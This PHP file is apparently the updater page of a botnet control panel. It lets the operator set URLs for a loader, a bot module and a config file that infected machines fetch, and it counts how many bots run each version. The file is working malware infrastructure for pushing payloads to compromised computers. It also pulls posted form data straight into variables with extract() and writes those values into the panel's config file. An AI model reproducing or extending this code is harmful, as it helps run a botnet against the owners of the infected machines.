<?php

define("TPL_TITLE", "Updater");

CsrConnectToDb();

$msg = array();

if (isset($_POST["update"]))
{
	extract($_POST);
	
	$config_tpl = CsrGetConfigTpl();
	
	if (isset($loader_update) && $loader_update== "on") 
	{	
		if (CsrCacheReset(0, $url_loader)) {
			$config["loader_url"] = $url_loader;
			$msg[] = "<font color=green> Loader update success. </font>";
		}
		else {
			$msg[] = "<font color=red> Loader update failed.<br/>Please check the permissions on write to tmp/update_data_*.cache and the availabity of this file: {$url_loader}.</font>";
		}
	}
	
	if (isset($bot_update) && $bot_update== "on")
	{	
		if (CsrCacheReset(1, $url_module)) {
			$config["module_url"] = $url_module;
			$msg[] = "<font color=green> Bot update success. </font>";
		}
		else {
			$msg[] = "<font color=red> Bot update failed.<br/>Please check the permissions on write to tmp/update_data_*.cache and the availabity of this file: {$url_module}.</font>";
		}
	}
	
	if (isset($config_update) && $config_update == "on")
	{	
		if (CsrCacheReset(2, $url_config)) {
			$config["config_url"] = $url_config;
			$msg[] = "<font color=green> Config update success. </font>";
		}
		else {
			$msg[] = "<font color=red> Config update failed.<br/>Please check the permissions on write to tmp/update_data_*.cache and the availabity of this file: {$url_config}.</font>";
		}
	}
	
	$str_config = sprintf($config_tpl, $config["user"], $config["pass"], $config["sql_host"], $config["sql_user"], $config["sql_pass"], $config["sql_db"], 
												$config["botnet_crypt_key"], $config["bot_timeout"], $config['loader_url'], $config['module_url'], $config['config_url'], $config["cache_file"]);
																	
	file_put_contents(CORE . "config.php", $str_config);
}

$fileSize = filesize("tmp/" . $GLOBALS['config']['cache_file']);
if ($fileSize == 12) 
{
	$fp = @fopen("tmp/" . $GLOBALS['config']['cache_file'], "rb");
	if ($fp) {
		$data = fread($fp, $fileSize);
		$loaderCrc = CsrToUint(substr($data, 0, 4));
		$botCrc = CsrToUint(substr($data, 4, 4));
		$configCrc = CsrToUint(substr($data, 8, 4));
		fclose($fp);
	}
}

$numUpdates['loader'] = isset($loaderCrc) ? CsrSqlQueryRowEx("select count(*) from `bots` where `loader_crc` = {$loaderCrc}") : 0;
$numUpdates['bot'] = isset($botCrc) ? CsrSqlQueryRowEx("select count(*) from `bots` where `bot_crc` = {$botCrc}") : 0;
$numUpdates['config'] = isset($configCrc) ? CsrSqlQueryRowEx("select count(*) from `bots` where `config_crc` = {$configCrc}") : 0;

ob_start();
?>

<form class="form-horizontal" method='post'>
		<table class="table table-striped table-bordered table-condensed table-hover">
			<tr>
				<td class=col-sm-2> URL loader </td> 
				<td class=col-sm-9> <input type="text" class="form-control input-sm" name="url_loader" value="<?=$config["loader_url"]?>"> </td>
				<td class=col-sm-1> <font color=green> <?=$numUpdates['loader']?> </font> </td>
				<td align=center> <input type='checkbox' name='loader_update'/>  </td>
			</tr>
			<tr>
				<td> URL bot </td> 
				<td> <input type="text" class="form-control input-sm" name="url_module" value="<?=$config["module_url"]?>"> </td>
				<td> <font color=green> <?=$numUpdates['bot']?> </font> </td>
				<td align=center> <input type='checkbox' name='bot_update'/>  </td>
			</tr>
			<tr>
				<td> URL config </td> 
				<td> <input type="text" class="form-control input-sm" name="url_config" value="<?=$config["config_url"]?>"> </td>
				<td> <font color=green> <?=$numUpdates['config']?> </font> </td>
				<td align=center> <input type='checkbox' name='config_update'/>  </td>
			</tr>
		</table>
	
	<div>
		<div class='pull-left'> <? foreach ($msg as $m) echo $m . "<br/><br/>"; ?> </div>
		<div class='pull-right'> <button type="submit" name='update' class="btn btn-default btn-sm"> Update</button> </div>
	</div>
</form>

<?php

$content = ob_get_contents();
ob_end_clean();

$header_tpl = file_get_contents(TPL_PATH . "header.html");
$header_tpl = str_replace(array("{TPL}", "{SCRIPTS}", "{TITLE}"), array(TPL_PATH, "", TPL_TITLE), $header_tpl);

$menu_tpl = file_get_contents(TPL_PATH . "menu.html");
$menu_tpl = str_replace(array("{CORE_FILE}", "{CUR_TIME}", "{UPDATER_ACTIVE}"), array(CORE_FILE, gmdate("M d Y H:i:s", mktime()), "active"), $menu_tpl);

$body_tpl = file_get_contents(TPL_PATH . "body.html");
$body_tpl = str_replace(array("{MENU}", "{BODY_CLASS}", "{CONTENT}"), array($menu_tpl, "bots", $content), $body_tpl);
$footer_tpl = file_get_contents(TPL_PATH . "footer.html");

echo str_replace(array("{HEADER}", "{BODY}", "{FOOTER}"), array($header_tpl, $body_tpl, $footer_tpl), file_get_contents(TPL_PATH . "main.html"));

?>